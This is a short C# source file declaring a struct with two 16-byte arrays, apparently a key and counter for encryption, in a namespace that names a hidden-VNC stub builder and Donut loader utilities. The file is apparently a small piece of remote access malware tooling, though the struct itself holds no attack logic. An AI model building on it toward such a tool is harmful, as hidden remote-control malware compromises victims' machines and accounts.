using System.Runtime.InteropServices;

namespace BirdBrainmofo.HVNC.StubUtils.Donut.Structs
{
    public struct DSCrypt
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public byte[] byte_0;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public byte[] ctr;
    }
}
